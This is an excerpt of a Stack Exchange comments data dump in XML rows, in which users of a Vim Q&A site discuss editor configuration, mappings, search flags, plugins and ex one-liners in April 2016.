  <row Id="12062" PostId="7357" Score="2" Text="Works for me. Did you run a search before running `:CopyMatches a`?" CreationDate="2016-04-15T19:44:26.543" UserId="205" />
  <row Id="12063" PostId="7357" Score="0" Text="Okay that did it.  Thanks." CreationDate="2016-04-15T19:48:55.340" UserId="1065" />
  <row Id="12064" PostId="7358" Score="0" Text="I was not aware of that.  Thank you!" CreationDate="2016-04-15T19:50:54.010" UserId="1065" />
  <row Id="12065" PostId="4144" Score="0" Text="@SibiCoder Yes, vim is compiled with the multibyte option, and the encoding is set to utf-8." CreationDate="2016-04-15T21:42:51.217" UserId="2774" />
  <row Id="12067" PostId="7361" Score="0" Text="Interesting approach! I'll give this a try." CreationDate="2016-04-16T00:53:12.743" UserId="3264" />
  <row Id="12068" PostId="2315" Score="0" Text="I learnt new thing today. Thanks :)" CreationDate="2016-04-16T09:19:37.333" UserId="7161" />
  <row Id="12069" PostId="6378" Score="0" Text="Why don't you go for plugins? A similar one is increment.vim in Github" CreationDate="2016-04-16T11:01:42.213" UserId="7161" />
  <row Id="12070" PostId="7371" Score="3" Text="You don't want plugins, but [vimtex](https://github.com/lervag/vimtex) seems to fit the bill - it doesn't mess with snippets, and it provides multiple ways to specify the master tex file." CreationDate="2016-04-16T11:09:03.807" UserId="205" />
  <row Id="12071" PostId="7373" Score="0" Text="That's not an additional assumption, it's the second bullet point. :)" CreationDate="2016-04-16T12:32:46.133" UserId="205" />
  <row Id="12072" PostId="7373" Score="0" Text="I was referring to the fact that it might be missing, which would result in the list being empty, I just wanted to be on the safe side ;)" CreationDate="2016-04-16T12:34:46.503" UserId="3343" />
  <row Id="12073" PostId="7373" Score="0" Text="Ah, yes. I should check that too. But I'm throwing an exception anyway, so …" CreationDate="2016-04-16T12:35:43.070" UserId="205" />
  <row Id="12074" PostId="7375" Score="0" Text="okay ! and \ is the leader key. Thanks I'm happy now with that plugin in my toolbox :)" CreationDate="2016-04-16T13:46:55.090" UserId="6078" />
  <row Id="12075" PostId="7377" Score="2" Text="Please, give us a real world example and show us your `vimrc`." CreationDate="2016-04-16T14:50:56.877" UserId="54" />
  <row Id="12076" PostId="7377" Score="1" Text="What's the output of `:echo &amp;gd` and what happens if you add a 2nd `g` flag like this: `%s/hello/goodbye/gg` or if you remove the `g` flag entirely? If the output of `:echo &amp;gd` is `1`, try adding `set nogdefault` at the end of your `vimrc`." CreationDate="2016-04-16T15:27:23.777" UserId="6960" />
  <row Id="12077" PostId="7367" Score="0" Text="That explains your recent post on [ubuntu.se]. I wondered why it didn't use `bufdo` or `argdo`." CreationDate="2016-04-16T16:03:46.120" UserId="205" />
  <row Id="12081" PostId="7367" Score="1" Text="@muru also because argdo is not POSIX http://pubs.opengroup.org/onlinepubs/9699919799/utilities/ex.html, nor is `{1..4}`" CreationDate="2016-04-16T16:42:47.913" UserId="7184" />
  <row Id="12085" PostId="7377" Score="0" Text="Fine! I don't know why but by default it was set to 0 so I added `set nogdefault` like you said and it works now, by the way.  Thank you!" CreationDate="2016-04-16T18:22:19.807" UserId="6078" />
  <row Id="12086" PostId="7378" Score="0" Text="What a stupid plugin! Use whatever works." CreationDate="2016-04-16T19:59:02.967" UserId="54" />
  <row Id="12087" PostId="7345" Score="0" Text="Thanks a lot!! I'll check it soon! Sounds great!" CreationDate="2016-04-16T20:58:24.797" UserId="5182" />
  <row Id="12088" PostId="7378" Score="0" Text="I really agree with romainl: it is good to learn how to navigate efficiently in a file but imposing to yourself this kind of plugin is a not necessary pain. Still you could be interested in my answer [here](http://vi.stackexchange.com/a/7335/1841) (more precisely the part about `/` and `?`." CreationDate="2016-04-16T22:04:22.543" UserId="1841" />
  <row Id="12091" PostId="3027" Score="0" Text="note bufdo is not POSIX http://pubs.opengroup.org/onlinepubs/9699919799/utilities/ex.html" CreationDate="2016-04-17T00:34:20.527" UserId="7184" />
  <row Id="12092" PostId="2998" Score="0" Text="note bufdo is not POSIX http://pubs.opengroup.org/onlinepubs/9699919799/utilities/ex.html" CreationDate="2016-04-17T00:35:01.377" UserId="7184" />
  <row Id="12094" PostId="7378" Score="1" Text="I would respectfully disagree with statox and romainl here. Navigating directly to the targets you want to change can greatly improve your overall efficiency. While yes this may slow you down at first, In the long run you will make up for the lost time using better navigations." CreationDate="2016-04-17T06:39:21.933" UserId="7254" />
  <row Id="12095" PostId="7386" Score="3" Text="Related: [`:h [[=`](http://vimhelp.appspot.com/pattern.txt.html#%2F%5B%5B%3D) and [`:h patterns-composing`](http://vimhelp.appspot.com/pattern.txt.html#patterns-composing)." CreationDate="2016-04-17T14:08:54.093" UserId="205" />
  <row Id="12098" PostId="7378" Score="0" Text="Actually @Archangel33 I think we share the same opinion about the fact that navigating more precisely with other methods than `hjkl` is a good thing. What I was disapproving was the plugin itself: In my opinion it is better to learn new ways to navigate once at the time (you can't learn all of them at the same time) and during the learning using plugins which frustrates you is not necessary. That being said it is only my opinion: one has right to disagree :-)" CreationDate="2016-04-17T19:00:49.777" UserId="1841" />
  <row Id="12100" PostId="7390" Score="0" Text="That adds a newline between the replaced text and the rest of the line, doesn't it?" CreationDate="2016-04-17T20:10:49.643" UserId="2774" />
  <row Id="12101" PostId="7390" Score="2" Text="@muk.li that's part of the output of `date`. If you try something like `system('printf %s foo')`, which doesn't output a trailing newline, you'll see there's a difference." CreationDate="2016-04-17T20:12:49.650" UserId="205" />
  <row Id="12102" PostId="7390" Score="2" Text="@muk.li if you just want the date in the text, there's the [`strftime`](http://vimhelp.appspot.com/eval.txt.html#strftime%28%29) function which you can use instead of `system('date …')`. The format string is the same." CreationDate="2016-04-17T20:27:51.263" UserId="205" />
  <row Id="12103" PostId="7362" Score="1" Text="This still does not provide the script path from inside a function. I don't think any of the modifiers will help, I think I need a completely different solution other than calling expand(). It is not a problem of the path being full or partial, or relative. The problem is `&lt;sfile&gt;` expands to the function name when called inside a function." CreationDate="2016-04-17T20:28:48.417" UserId="1410" />
  <row Id="12105" PostId="7393" Score="2" Text="Instead of running `strace`, use `:scriptnames`. Why does the `strace` output show `/home/sergio/.vimrc/` with a trailing slash, as if it were a directory? And `-S` is for restoring a session, not loading a vimrc. The option for setting a vimrc is `-u`: `vim -u ~/.vimrc`, for example." CreationDate="2016-04-17T23:29:06.017" UserId="205" />
  <row Id="12106" PostId="7393" Score="0" Text="Respect trailing slash, it was a typo, regarding `-S` my man page it says: `-S {file}   {file}  will  be  sourced  after  the  first  file has been read.  This is equivalent to -c &quot;source {file}&quot;.  {file} cannot start with '-'.  If {file} is omitted &quot;Session.vim&quot;  is  used  (only  works when -S is the last argument).`" CreationDate="2016-04-18T03:01:38.957" UserId="6950" />
  <row Id="12107" PostId="7393" Score="5" Text="Use Vim normally to make it work normally: `$ vim` or `$ vim .` or `$ vim filename` or `$ vim *.ext`." CreationDate="2016-04-18T05:40:19.030" UserId="54" />
  <row Id="12108" PostId="7379" Score="0" Text="Thanks! I will look into this for sure, if my snippets will remain untouched. It seems a bit strange though, and I am unnerved by the thought of not being in control of when my document is compiled, and for that reason less certain of when errors pop up. But I am sure these things are dealt with just fine by the extension." CreationDate="2016-04-18T06:53:16.867" UserId="7258" />
  <row Id="12109" PostId="7362" Score="2" Text="@still_dreaming_1 I edited the answer with a workaround to keep the filename, I hope it fits your needs." CreationDate="2016-04-18T07:32:47.930" UserId="1841" />
  <row Id="12110" PostId="7390" Score="1" Text="You do not need to delete selected text. You can use `&quot;=system('date +%Y%m%d')p` on visual selection instead." CreationDate="2016-04-18T08:03:53.350" UserId="1259" />
  <row Id="12111" PostId="7379" Score="0" Text="I can only say that I _try_ to deal with these things, and that I _think_ I have dealt with a lot of them in a good manner. However, I also actively maintain the project, and I try to solve issues as they are raised. Note, though, that you can use vimtex also with single shot compilation, but this will not provide a direct feedback when the compilation is completed, unless you let it compile in the foreground. Don't hesitate to ask if there is anything you're wondering about." CreationDate="2016-04-18T08:54:58.270" UserId="21" />
  <row Id="12112" PostId="7393" Score="3" Text="What problem are you trying to solve? This has all the signs of being an [XY problem](http://meta.stackexchange.com/q/66377/166789)." CreationDate="2016-04-18T11:38:10.357" UserId="51" />
  <row Id="12113" PostId="7396" Score="0" Text="I don't know if it will help but I found this answer: http://stackoverflow.com/a/30022579" CreationDate="2016-04-18T12:45:04.787" UserId="6960" />
  <row Id="12114" PostId="7396" Score="0" Text="thanks, I saw that and tried it too. it didnt seem to do anything" CreationDate="2016-04-18T12:47:06.677" UserId="4603" />
  <row Id="12116" PostId="7398" Score="3" Text="Depending on your system you probably have an environment variable or a configuration file which contains your current layout. You could read it from your `.vimrc` and create a condition on it. The problem is that it might be a problem to make this code portable since (as far as I know) not all the distributions keep this information in the same place." CreationDate="2016-04-18T15:27:06.747" UserId="1841" />
  <row Id="12117" PostId="7391" Score="0" Text="It adds a newline at the end of the file. Also when `alfa.txt` has `1, 3, 5 , ...` lines the last line is ignored since it doesn't match." CreationDate="2016-04-18T17:10:50.610" UserId="6698" />
  <row Id="12118" PostId="7391" Score="0" Text="@JairLopez thank you for the comment. Did you have a better solution?" CreationDate="2016-04-18T17:53:21.873" UserId="7184" />
  <row Id="12119" PostId="7391" Score="0" Text="No. I didn't. But I think your previous workaround was better.  As far as I can remember, it was `ex -sc 'g/^/s//&gt; /|pu_|j' -cx alfa.txt`. The only drawback was the newline at the end." CreationDate="2016-04-18T18:08:06.493" UserId="6698" />
  <row Id="12120" PostId="7402" Score="0" Text="I have [something close to the original vi](http://ex-vi.sourceforge.net/), and it doesn't seem to go back n steps." CreationDate="2016-04-18T19:49:21.580" UserId="205" />
  <row Id="12123" PostId="7391" Score="0" Text="@JairLopez yes that is right. However it does not scale. If you wanted every 3 lines, you would need `ex -sc 'g/^/s//&gt; /|pu_|j|pu_|j' -cx alfa.txt`" CreationDate="2016-04-18T20:16:17.313" UserId="7184" />
  <row Id="12124" PostId="7391" Score="0" Text="I see. You could try `ex -sc '$pu_' -c '%s/\v(.*\n){2}/&gt; &amp;/' -c '$d|x'`. In that way it could work when `alfa.txt` has `1, 3, 5, ...` lines, but it still adds a newline at the end of the file." CreationDate="2016-04-18T20:47:09.613" UserId="6698" />
  <row Id="12127" PostId="7378" Score="0" Text="Possible duplicate of: [hardcore-vim-mode-what-is-the-best-way-to-move-vertically](http://vi.stackexchange.com/questions/7323/hardcore-vim-mode-what-is-the-best-way-to-move-vertically) (Although I actually prefer this question because it is more concise!)" CreationDate="2016-04-19T05:59:37.827" UserId="630" />
  <row Id="12129" PostId="7409" Score="0" Text="have you tried something with autocommands ? see http://vimdoc.sourceforge.net/htmldoc/autocmd.html" CreationDate="2016-04-19T08:42:04.393" UserId="1821" />
  <row Id="12130" PostId="7409" Score="0" Text="@Nobe4 I have used `autocmd` before but I am not sure how I would use them is this case?" CreationDate="2016-04-19T09:02:15.107" UserId="7052" />
  <row Id="12131" PostId="7409" Score="1" Text="My first guess would be to trigger a custom function on each resizing (e.g. `WinEnter`, `WinLeave`, but others may be more suitable) that apply `:resize 60` to the desired split. Or maybe with the `'winheight'` option." CreationDate="2016-04-19T09:06:52.660" UserId="1821" />
  <row Id="12132" PostId="7409" Score="0" Text="Hey @Nobe4 any idea how I would target that window/split specifically I have looked at setting a custom ID but I can't quite seem to get it working." CreationDate="2016-04-19T09:27:08.933" UserId="7052" />
  <row Id="12133" PostId="7401" Score="0" Text="This does not exactly answer my too general question... but is even better ! Thanks." CreationDate="2016-04-19T10:35:24.543" UserId="7128" />
  <row Id="12134" PostId="693" Score="0" Text="From [`:h search()`](http://vimhelp.appspot.com/eval.txt.html#search%28%29): `w` means `wrap around the end of the file` and `W` means `don't wrap around the end of the file`. But why did you put them together on the second `:map`?" CreationDate="2016-04-19T10:53:37.023" UserId="6698" />
  <row Id="12135" PostId="693" Score="0" Text="@JairLopez Correct, `w` shouldn't be there, so I've removed it, thanks. Probably I was confused by motion keys meaning." CreationDate="2016-04-19T11:03:55.450" UserId="467" />
  <row Id="12137" PostId="7412" Score="0" Text="Thanks. But still I couldn't get it. I wrote this command line in a plaugin. Is it necessary that I need to write this line directly in .vimrc? It doesn't work" CreationDate="2016-04-19T11:30:10.760" UserId="7161" />
  <row Id="12138" PostId="7412" Score="1" Text="you can use it directly in your command line to try it out first. What output do you get?" CreationDate="2016-04-19T11:30:53.113" UserId="1821" />
  <row Id="12139" PostId="7412" Score="1" Text="I tried. Sorry, my multiline text has pipeline after ^M. That is the problem I think. I escaped it. Bow it works :)" CreationDate="2016-04-19T11:35:49.880" UserId="7161" />
  <row Id="12140" PostId="7398" Score="1" Text="For the users coming to this question I think OP solved his problem by asking [this other question](http://vi.stackexchange.com/questions/7399/extract-the-result-of-a-shell-command-to-a-variable-in-a-vimrc-file)" CreationDate="2016-04-19T11:40:26.900" UserId="1841" />
  <row Id="12141" PostId="7413" Score="0" Text="I tried this in all different modes like abbr, iabbr, imap, inoremap also. Didn't work." CreationDate="2016-04-19T12:25:15.670" UserId="7161" />
  <row Id="12142" PostId="120" Score="0" Text="Pressing g and then direction key might avoid tabs and move across lines" CreationDate="2016-04-19T12:40:13.283" UserId="7161" />
  <row Id="12143" PostId="7413" Score="2" Text="I don't understand your problem: if you use `:iabbrev conf configuration` the full word will appear when you write `conf` so you fixed the minimum letters to write to trigger the abbreviation, right?" CreationDate="2016-04-19T12:42:43.537" UserId="1841" />
  <row Id="12144" PostId="7398" Score="0" Text="I tried to, but in the end it didn't solve my problem : the $LANG variable does not contain the keyboard layout.&#xA;In the end I built a function I have to call if I want to change my mappings." CreationDate="2016-04-19T12:53:50.610" UserId="7128" />
  <row Id="12145" PostId="7398" Score="0" Text="What system do you use? Sometimes it is in a configuration file instead of a variable." CreationDate="2016-04-19T12:55:05.387" UserId="1841" />
  <row Id="12146" PostId="7398" Score="0" Text="@statox : I use a CentOS Linux or a MacOS X, but I always ssh to the server on which I'm working" CreationDate="2016-04-19T12:55:59.997" UserId="7128" />
  <row Id="12147" PostId="7398" Score="0" Text="Maybe you could configure each of your machine to send a variable containing the layout (define it manually with [that for example](http://superuser.com/a/702751/386795) ) then on the server you should be able to read the variable you send with the help of your other question." CreationDate="2016-04-19T13:00:53.087" UserId="1841" />
  <row Id="12148" PostId="7414" Score="0" Text="Thanks for the detailed proposition -- one problem though : I am not (and will never be) root on the server I'm using. &#xA;&#xA;Hence I wrote a function in my .vimrc Kbdmodes(lang), where 'lang' can be 'qwerty', 'azerty'. My problem is now to call it &quot;automatically&quot; when vim starts... I'll probably ask a new question if I can't figure it out." CreationDate="2016-04-19T13:18:13.337" UserId="7128" />
  <row Id="12150" PostId="7413" Score="1" Text="That's right. In case if I happen to type confi (an additional lettler, without typing a space and typing the next letter), still it has to expand. That's what I want. Since we have to deal with hundreds of words while typing, it might be difficult to type exact short part every time." CreationDate="2016-04-19T13:34:39.747" UserId="7161" />
  <row Id="12151" PostId="7418" Score="3" Text="can you try using `END` instead of `end` for the closing part of `augroup` ? It should act the same, but with the lower-case version it would not work whereas with the uppercase it works" CreationDate="2016-04-19T15:19:02.080" UserId="1821" />
  <row Id="12152" PostId="7418" Score="2" Text="@Nobe4 that does it!  (do you want to 'answer' it so I can mark you and the solution?)" CreationDate="2016-04-19T15:20:33.260" UserId="4543" />
  <row Id="12153" PostId="7413" Score="4" Text="You should use dictionary completion. Abbreviations and mappings don't fit your use case." CreationDate="2016-04-19T15:59:23.373" UserId="54" />
  <row Id="12155" PostId="7419" Score="5" Text="This is because the `indent/vim.vim` file does: `elseif prev_text =~ '^\s*aug\%[roup]' &amp;&amp; prev_text !~ '^\s*aug\%[roup]\s*!\=\s\+END'`. This is a bug; the check should be case-insensitive." CreationDate="2016-04-19T16:07:00.607" UserId="51" />
  <row Id="12156" PostId="7419" Score="2" Text="Do you know if it's already acknowledged by the vim-team as a bug ?" CreationDate="2016-04-19T16:07:49.487" UserId="1821" />
  <row Id="12157" PostId="7419" Score="2" Text="No, that's just my own conclusion ;-)" CreationDate="2016-04-19T16:10:15.890" UserId="51" />
  <row Id="12158" PostId="7419" Score="2" Text="haha, it's strange that for the indent only the regex is messed up, because for the syntax file, they use `[eE][nN][dD]` each time...  I'll open an issue on the github repo." CreationDate="2016-04-19T16:15:38.777" UserId="1821" />
  <row Id="12160" PostId="7328" Score="0" Text="@Chong, I answered in issue. It is not useless, but certainly not perfect. But I'm very grateful anyway!" CreationDate="2016-04-19T17:46:52.267" UserId="5182" />
  <row Id="12161" PostId="7422" Score="0" Text="Why don't you simply insert a space before `'r'`?" CreationDate="2016-04-19T20:51:31.303" UserId="54" />
  <row Id="12162" PostId="7425" Score="4" Text="1) &quot;What are your workflows?&quot; - I feel that is going to be way to broad of a question. 2) You can open up a directory in Vim (or use `:cd`) 3) [Vim has no concept of what a project is](http://stackoverflow.com/q/25288230/438329). So you will get many makeshift solutions designed around other's *personal* workflows 4) What do you need when working on a project? [navigation](https://github.com/tpope/vim-projectionist)? [tags](http://tbaggery.com/2011/08/08/effortless-ctags-with-git.html)? [Session](https://github.com/dhruvasagar/vim-prosession)? [Settings](http://vimawesome.com/?q=local)?" CreationDate="2016-04-19T21:38:09.517" UserId="778" />
  <row Id="12164" PostId="7427" Score="0" Text="What do you expect to happen exactly?" CreationDate="2016-04-20T04:20:21.387" UserId="54" />
  <row Id="12165" PostId="7427" Score="0" Text="I expect it to scroll one line up, and show a `@=&quot;^E&quot;` message. I'm perplexed as to why it wont work for `&lt;c-e&gt;` but will for seemingly any other `&lt;c-...&gt;` character." CreationDate="2016-04-20T05:56:11.023" UserId="7166" />
  <row Id="12167" PostId="7427" Score="1" Text="`nnoremap &lt;C-n&gt; &lt;C-e&gt;`" CreationDate="2016-04-20T07:07:48.737" UserId="54" />
  <row Id="12168" PostId="7433" Score="0" Text="I removed vim from the alias part and tried. Still it didn't work" CreationDate="2016-04-20T07:53:58.467" UserId="7161" />
  <row Id="12169" PostId="7433" Score="0" Text="It works with a pipeline in between. :tabnew | !abs opens my file.   Do I need to delete this question?  @Nobe4" CreationDate="2016-04-20T08:13:58.543" UserId="7161" />
  <row Id="12170" PostId="7433" Score="1" Text="I think you should answer your own question for further reference." CreationDate="2016-04-20T08:15:21.740" UserId="1821" />
  <row Id="12171" PostId="7433" Score="0" Text="OK. thanks @nobe4. :)" CreationDate="2016-04-20T08:18:48.617" UserId="7161" />
  <row Id="12172" PostId="7435" Score="0" Text="@nobe4 but it doesn't work when I use multiple pipelines, example: tabnew | !ls -1 | tail -1 should open the first file in the directory. But it doesn't work the expected way" CreationDate="2016-04-20T08:28:52.003" UserId="7161" />
  <row Id="12173" PostId="7433" Score="4" Text="@SibiCoder depending on your needs you could also be interested in the use of marks. Instead of creating an alias in your shell's rc file you could open your file with Vim once and mark it with `mA` (you can replace `A` by any capital letter). Then at any time you can use `'A` to reopen this file (even if you closed vim). You can use `:marks` to see all of your bookmarks. See [`:h bookmark`](http://vimdoc.sourceforge.net/htmldoc/usr_03.html#bookmark) for more information." CreationDate="2016-04-20T10:02:45.057" UserId="1841" />
  <row Id="12174" PostId="7433" Score="0" Text="@statox thanks. Problem with marks is, when I move to other script through global mark and come back to the original script, I can't undo the changes. Also, I had to save the script and then switch to other file thorugh mark in case if I did any  changes .  in case of references, marks do help me :)" CreationDate="2016-04-20T10:38:03.297" UserId="7161" />
  <row Id="12175" PostId="7433" Score="3" Text="I'm reasonably certain `:tabnew | !abs` starts a new Vim instance after opening a new tab, instead of opening a tab with that file loaded. (Compare:  what will happen if you run just `:!abs`?)" CreationDate="2016-04-20T10:56:06.950" UserId="205" />
  <row Id="12176" PostId="7372" Score="0" Text="Can I just put ```:execute &quot;digraphs es &quot; . 0x2091``` in the vimrc and let the vim compile it to change the default settings everytime I open or creat a file? I have tried and it doesn't work. How can I do that?" CreationDate="2016-04-20T11:49:31.430" UserId="1788" />
  <row Id="12177" PostId="7438" Score="3" Text="With `:norm! D` you prevent the mapping to be triggered. Just use `norm D`" CreationDate="2016-04-20T14:41:26.800" UserId="626" />
  <row Id="12178" PostId="7438" Score="0" Text="So the context of the `norm` (and I guess every other command) is the file, and not the debug window ?" CreationDate="2016-04-20T14:43:23.397" UserId="1821" />
  <row Id="12179" PostId="7426" Score="0" Text="Awesome answers, the both of you." CreationDate="2016-04-20T15:20:14.840" UserId="7298" />
  <row Id="12180" PostId="7438" Score="0" Text="No. With the bang, you prevent the mapping to be executed, and in the end, the default behaviour will be triggered: `d$`. `:h :normal`" CreationDate="2016-04-20T15:39:54.067" UserId="626" />
  <row Id="12181" PostId="7430" Score="0" Text="Since you are using vim-obsession you may want to look at [vim-prosession](https://github.com/dhruvasagar/vim-prosession) which leverages obsession to make switching between sessions a bit easier. If [switching between git roots](http://stackoverflow.com/a/28289482/438329) is your thing there is a post on the subject." CreationDate="2016-04-20T15:51:55.277" UserId="778" />
  <row Id="12182" PostId="7440" Score="0" Text="Thanks. I will try." CreationDate="2016-04-20T16:15:19.890" UserId="7161" />
  <row Id="12183" PostId="7441" Score="0" Text="Rather than a function, you can use key mappings simply." CreationDate="2016-04-20T16:39:32.100" UserId="7161" />
  <row Id="12184" PostId="7442" Score="1" Text="nice, do you know if those flags exists for the `/`/`?` also ?" CreationDate="2016-04-20T17:29:29.533" UserId="1821" />
  <row Id="12185" PostId="7442" Score="2" Text="@Nobe4 I don't know for the `c` and `n` flags, but you can get something similar to `W` by typing `:set nowrapscan`. You can also apply some offsets after a `/` / `?` search. For example, `/foobar/e` should position the cursor on the end of the next `foobar` (`r`), and `?foobar?s+3` should position the cursor on the third character after the start of the previous `foobar` (`b`). Other than that, I don't know if you can tweak the behavior of a search." CreationDate="2016-04-20T17:45:08.863" UserId="6960" />
  <row Id="12186" PostId="7441" Score="0" Text="I did at first, that's how my .vimrc is set at the moment : I press my shortcut each time I want to know in which subroutine I am. But I wanted it to be automatic and permanent (hence the displaying in the statusline). &#xA;&#xA;Or maybe I am misunderstanding you ?" CreationDate="2016-04-20T17:51:36.730" UserId="7128" />
  <row Id="12187" PostId="7442" Score="0" Text="Wow. This shows how much I have to learn about vim. Thank you very much, I will test it asap." CreationDate="2016-04-20T17:52:47.887" UserId="7128" />
  <row Id="12189" PostId="7427" Score="0" Text="I ran into this problem because I wanted to have a mapping like `nnoremap &lt;c-n&gt; @=&quot;&lt;c-e&gt;j&quot;`; that scrolls the window and moves my cursor down at the same time. The @= makes it so the operation is repeatable. ie I can press `10` `ctrl-n` to scroll the window, and move cursor 10 lines down. `nnoremap &lt;c-n&gt; &lt;c-e&gt;j` scrolls the window down 10 but the cursor only goes down 1. The mapping `nnoremap &lt;c-p&gt; @=&quot;&lt;c-y&gt;k&quot;` which does the exact opposite, works perfectly fine." CreationDate="2016-04-20T18:32:57.920" UserId="7166" />
  <row Id="12190" PostId="7437" Score="0" Text="Thank you so much! This is exactly the information I needed." CreationDate="2016-04-20T18:40:42.317" UserId="7166" />
  <row Id="12191" PostId="7434" Score="1" Text="I'm sorry, I oversimplified my original question to point out the problem. I need the expression register because I'm trying to create a repeatable command that uses `ctrl-e` `j` ie @=&quot;&lt;c-e&gt;j&quot; to move the screen and cursor down n lines. You need an expression register for that to be executed properly. I was also curious as to why &lt;c-e&gt; wouldn't work in the mapping." CreationDate="2016-04-20T18:53:30.867" UserId="7166" />
  <row Id="12192" PostId="7430" Score="0" Text="vim-prosession looks pretty useful, thanks!  I live in the terminal, so my &quot;workflow&quot; is to have one tmux tab per project.  I feel it's easy enough to cd into ~/dev/lang/project or ~/dev/company/project that I don't need to complicate it with scripting.  The bonus is that new tmux panes start in the project directory." CreationDate="2016-04-20T19:19:47.750" UserId="5229" />
  <row Id="12193" PostId="7449" Score="6" Text="This has nothing to do with `tmux`, you simply want to be able to yank/paste between two different instances of `vim`, right?" CreationDate="2016-04-21T04:03:23.830" UserId="6154" />
  <row Id="12194" PostId="7446" Score="2" Text="Thanks for the details explanation! However it seems to color only the quotes (see the blue color in http://i.imgur.com/ZrLkN6H.png), but not the content which remains white. Don't sweat it though, I think I am starting to get accustomed with the default VIM white colors" CreationDate="2016-04-21T04:39:02.083" UserId="7318" />
  <row Id="12196" PostId="7431" Score="0" Text="&gt;  Vim is first and foremost designed for the shell.&#xA;&#xA;The only problem I have is that the shell vim is scrolling stutterly (iTerm2 and Terminal: tried vim and neovim) whereas the Gui vim (macvim) scrolls super fast without any visual problems." CreationDate="2016-04-21T06:33:36.607" UserId="5674" />
  <row Id="12197" PostId="7451" Score="1" Text="Can you provide more informations? I just tried your two commands and both have the same amount of information, except the second one is inside vim (with color, ...)" CreationDate="2016-04-21T08:09:30.020" UserId="1821" />
  <row Id="12198" PostId="7452" Score="1" Text="Neovim on Homebrew: https://github.com/neovim/homebrew-neovim" CreationDate="2016-04-21T08:20:42.577" UserId="1821" />
  <row Id="12199" PostId="7452" Score="0" Text="@Nobe4 I installed it but it is terminal neovim only. How can you get the graphical Neovim?" CreationDate="2016-04-21T08:36:42.220" UserId="2923" />
  <row Id="12200" PostId="7452" Score="1" Text="have a look at https://github.com/neovim/neovim/wiki/Related-projects" CreationDate="2016-04-21T08:41:59.997" UserId="1821" />
  <row Id="12201" PostId="7454" Score="0" Text="I tried this. :set path+=$PROJ/** . PROJ variable has our project's generic path like /project/trees/aaaa/aaaa/lib. But it didn't work. Match is a module deep under lib folder. But it doesn't recognize it. When I give this in command line of the current file, it works. But when I give it in my plugin. It doesnt  recognize." CreationDate="2016-04-21T09:29:49.350" UserId="7161" />
  <row Id="12202" PostId="7454" Score="1" Text="I got it working here with a similar command, can you provide more details in your question?" CreationDate="2016-04-21T09:47:04.193" UserId="1821" />
  <row Id="12203" PostId="7454" Score="0" Text="May I know why the set command works when I give in current file and not in .vimrc or plugin? Can the system/project admin restrict me to add additional path here?" CreationDate="2016-04-21T09:57:19.460" UserId="7161" />
  <row Id="12204" PostId="7454" Score="0" Text="After setting path in .vimrc, I came to script and checked set path command. It doesn't shoe the path I added." CreationDate="2016-04-21T09:59:26.067" UserId="7161" />
  <row Id="12205" PostId="7454" Score="1" Text="Maybe it's [an issue in your vimrc](http://vi.stackexchange.com/a/2004/1821)." CreationDate="2016-04-21T10:00:19.900" UserId="1821" />
  <row Id="12206" PostId="7444" Score="0" Text="Works great, maybe it should be put in a plugin to help the workflow." CreationDate="2016-04-21T10:09:07.943" UserId="1821" />
  <row Id="12207" PostId="7454" Score="0" Text="I moved vimrc file to other name, moved all plugins out of .vim folder to some other folder. Created a new vimrc file with this line alone. When I checked in the same vimrc file by giving set path in command line, it shows the added path. I closed vim and came again. But in script, it doesn't show. Only when I give the path in script, I am Able to use." CreationDate="2016-04-21T10:23:06.607" UserId="7161" />
  <row Id="12208" PostId="7454" Score="0" Text="I'm not sure I understand... What do you mean by `I closed vim and came again. But in script, it doesn't show. Only when I give the path in script, I am Able to use.` ?" CreationDate="2016-04-21T10:41:02.413" UserId="1821" />
  <row Id="12209" PostId="7454" Score="3" Text="@SibiCoder `:verbose set path?` will show you what is the last file that changed the path variable. Might be some system configuration file." CreationDate="2016-04-21T10:43:29.920" UserId="20" />
  <row Id="12210" PostId="7454" Score="0" Text="Yes. System config file named /usr/share/vim/vim72/ftplugin.vim has changed the path. Is there a solution to override this in vimrc?" CreationDate="2016-04-21T10:46:27.257" UserId="7161" />
  <row Id="12211" PostId="7450" Score="0" Text="what does the `scrollopt` say ?" CreationDate="2016-04-21T10:49:55.443" UserId="1821" />
  <row Id="12212" PostId="7450" Score="0" Text="`scrollopt=ver,jump`" CreationDate="2016-04-21T10:51:00.190" UserId="268" />
  <row Id="12213" PostId="7450" Score="0" Text="try set it to null, `set scrollopt=`, maybe it will solve the issue..." CreationDate="2016-04-21T10:51:41.683" UserId="1821" />
  <row Id="12214" PostId="7450" Score="0" Text="@Nobe4 That didn't work. :-/" CreationDate="2016-04-21T10:52:26.633" UserId="268" />
  <row Id="12215" PostId="7450" Score="0" Text="Another suggestion, how do you open the new file ? in the doc: `This option is mostly reset when splitting a window to edit another file.  This means that &quot;:split | edit file&quot; results in two windows with scroll-binding, but &quot;:split file&quot; does not.`" CreationDate="2016-04-21T10:54:00.633" UserId="1821" />
  <row Id="12216" PostId="7433" Score="0" Text="@statox  using :hide command along with marks can achieve the goal. Need to try that" CreationDate="2016-04-21T11:06:01.883" UserId="7161" />
  <row Id="12217" PostId="7444" Score="0" Text="In my snippets for mu-template, I have a [function](https://github.com/LucHermitte/mu-template/blob/master/after/template/vim/snr.template) that I use to export internal functions. I also have code in lh-vim-lib where I can obtain a scriptname given a function name. scriptnames updating is lazily done: [`lh#askvim#scriptname(id)`](https://github.com/LucHermitte/lh-vim-lib/blob/master/autoload/lh/askvim.vim#L82) -- I use it in the logging sub-library." CreationDate="2016-04-21T11:08:26.960" UserId="626" />
  <row Id="12218" PostId="7450" Score="0" Text="@Nobe4 I usually use `Ctrl-W v` so `:vsplit`." CreationDate="2016-04-21T11:13:58.253" UserId="268" />
  <row Id="12219" PostId="7454" Score="2" Text="The fast way is to use the after directory the following way: Create a file named `~/.vim/after/ftplugin.vim` and put your path changes there. This file will get loaded after the system one. I'm pretty sure there is a better way of using the after directory for this but I cannot remember at the moment." CreationDate="2016-04-21T11:22:52.353" UserId="20" />
  <row Id="12220" PostId="7450" Score="1" Text="`set cursorbind?`" CreationDate="2016-04-21T11:41:00.877" UserId="71" />
  <row Id="12221" PostId="7450" Score="0" Text="@ChristianBrabandt That was it!" CreationDate="2016-04-21T11:42:30.000" UserId="268" />
